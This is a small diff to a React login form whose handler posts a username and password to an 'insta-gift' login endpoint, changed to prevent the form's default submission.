@@ -7,7 +7,8 @@ const App = () => {
   const [username, setUsername] = React.useState("");
   const [password, setPassword] = React.useState("");
 
-  const servercall = async () => {
+  const servercall = async (e) => {
+    e.preventDefault();
     console.log("entered in servercall");
     const res = await fetch("https://insta-gift.onrender.com/api/v1/auth/login", {
       method: "POST",
@@ -42,7 +43,7 @@ const App = () => {
                 type="password"
                 placeholder="Password"
               />
-              <button className="form-btn" type="submit" onClick={servercall} >
+              <button className="form-btn"  onClick={servercall} >
                 Log in
               </button>
               <span className="has-separator">Or</span>
